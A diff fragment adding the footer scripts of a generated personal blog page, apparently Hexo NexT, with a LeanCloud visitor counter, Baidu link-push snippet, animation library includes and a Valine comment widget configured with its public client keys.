+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.id);
+      });
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          for (let url of entries) {
+            let target = results.find(item => item.url === url);
+            leancloudSelector(url).innerText = target ? target.time : 0;
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    let { app_id, app_key, server_url } = {"enable":true,"app_id":"rebG01SwSXMoY7eaX8QScfRV-MdYXbMMI","app_key":"u3yrkhkuseHahqDsz60AhPYz","server_url":null,"security":true};
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : app_id,
+            'X-LC-Key'    : app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    }
+
+    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(response => response.json())
+        .then(({ api_server }) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.1.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'I06GJpS9glw9Vb019QqawEVk-gzGzoHsz',
+      appKey     : 'cicAwmh5fPIP0nA0oiNQRhQk',
+      placeholder: "喵！被我抓到你偷鱼了！",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
